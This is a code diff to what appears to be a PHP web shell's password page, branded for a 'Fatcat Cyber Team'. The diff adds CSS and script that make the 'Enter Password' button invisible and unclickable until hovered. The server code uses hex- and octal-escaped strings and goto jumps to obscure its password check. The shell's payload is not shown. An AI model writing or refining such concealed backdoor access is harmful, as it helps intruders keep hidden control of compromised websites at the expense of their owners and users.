@@ -55,14 +55,33 @@ else
             display: none;
             margin-top: 20px;
         }
+        #passwordButton {
+            display: none; /* tombol tidak terlihat */
+        }
+        #showButton {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background-color: #000;
+            color: #fff;
+            border: 1px solid #fff;
+            padding: 5px 10px;
+            cursor: pointer;
+            opacity: 0; /* tombol tidak terlihat */
+            pointer-events: none; /* tidak bisa diklik */
+        }
+        #showButton:hover {
+            opacity: 1; /* tombol terlihat saat hover */
+            pointer-events: auto; /* bisa diklik saat hover */
+        }
     </style>
     <script>
         function togglePasswordForm() {
             var form = document.getElementById('passwordForm');
+            var button = document.getElementById('showButton');
             if (form.style.display === 'none' || form.style.display === '') {
                 form.style.display = 'block';
-            } else {
-                form.style.display = 'none';
+                button.style.display = 'none'; // Menyembunyikan tombol setelah mengklik
             }
         }
     </script>
@@ -71,7 +90,7 @@ else
     <center>
         <img src="https://i.ibb.co/w67prYF/Fatcat-Cyber-Team.png" alt="" width="300" height="90" />
         <pre><img src="https://imgur.com/48YgDZL.png" width="250" height="250" /></pre>
-        <button onclick="togglePasswordForm()">Enter Password</button>
+        <button id="showButton" onclick="togglePasswordForm()">Enter Password</button>
         <form id="passwordForm" action="" method="POST">
             <label for="password"></label> 
             <input id="password" name="password" type="password">
@@ -96,7 +115,7 @@ if (isset($_POST["\160\x61\x73\x73\x77\x6f\x72\144"]))
     } 
     else 
     { 
-        echo "\111\x6e\143\x6f\x72\162\x65\x63\164\x20\160\x61\163\163\167\x6f\x72\x64\x2e\x20\x50\154\x65\141\163\145\x20\164\x72\171\x20\141\147\x61\151\x6e\56"; 
+        echo "\111\x6e\143\x6f\x72\x72\x65\x63\x74\x20\160\x61\x73\x73\x77\x6f\x72\x64\x2e\x20\x50\154\x65\141\x73\145\x20\164\x72\x79\x20\141\147\x61\151\x6e\56"; 
     } 
 } 
 goto cJz_p; 
